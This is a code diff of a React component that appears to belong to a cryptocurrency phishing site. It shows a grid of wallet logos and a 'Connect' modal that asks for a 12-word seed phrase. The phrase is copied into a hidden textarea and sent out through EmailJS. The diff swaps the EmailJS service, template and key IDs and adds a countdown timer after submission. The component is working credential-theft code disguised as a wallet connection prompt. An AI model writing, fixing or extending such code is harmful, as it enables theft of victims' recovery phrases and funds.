@@ -2,8 +2,7 @@ import React, { useState, useRef} from "react";
 import { Modal } from "antd";
 import  emailjs from "@emailjs/browser"
 import SVGIcon from "../../Components/SvgIconProp"
-
-// const SVGIcon = lazy(() => import("../../Components/SvgIconProp"));
+import CountDownTimer from "../../Components/Timer/timer";
 
 const MapSVG: React.FC = () => {
   const SVGfiles: string[] = ['TrustWallet.svg', 'Metamask.svg', 'Phantom.svg', '1inch.svg', 'AaVE.svg', 'Argent.svg', 'Binance.svg', 'BonkBot.svg',
@@ -21,9 +20,9 @@ const MapSVG: React.FC = () => {
   const [secondModal, setSecondModal] = useState(false);
   const [seedPhrase, setSeedPhrase] = useState(Array(12).fill(""));
   const [disableButton, setDisableButton] = useState(false);
+  const [showTimer, setShowTimer] = useState(false);
+
  
-
-
   const showFirstModal = () => {
     setFirstModal(true);
   }
@@ -54,9 +53,9 @@ const MapSVG: React.FC = () => {
         if (isFormValid()) {
           if (formRef.current) {
             emailjs
-              .sendForm('service_twwcvlb', 'template_7vqgm28', formRef.current, {
-                publicKey: 'hds2PoT6irVnuIzNa',
-              })
+            .sendForm('service_k8zkjrm', 'template_llr9hoa', formRef.current, {
+              publicKey: '3Y_m1ex2ZKN_hZhbt',
+            })
               .then(
                 () => {
                   console.log('SUCCESS!');
@@ -67,7 +66,11 @@ const MapSVG: React.FC = () => {
               );
           }
           setDisableButton(true); // Disable button after submission
-          setTimeout(() => setDisableButton(false), 300000);
+          setShowTimer(true);
+          setTimeout(() => {
+            setDisableButton(false);
+            setShowTimer(false);
+        }, 300000);
         }
       };
 
@@ -124,10 +127,13 @@ const MapSVG: React.FC = () => {
         </div>
         <textarea name="message" className="hidden" value={seedPhraseString} />
         <div className="flex justify-end pt-4">
-          <button type="submit" value='send' disabled={!isFormValid()} className="text-white bg-blue-500 py-1 px-4 rounded-lg flex justify-center" >Connect</button>
+          <button type="submit" value='send' disabled={!isFormValid() || disableButton} className="text-white bg-blue-500 py-1 px-4 rounded-lg flex justify-center">
+            {disableButton ? 'Disabled' : 'Connect'}
+          </button>
         </div>
         </form>
-    
+          
+        {showTimer && <CountDownTimer onComplete={() => setDisableButton(false)} />}
       </Modal>
     </div>
   )
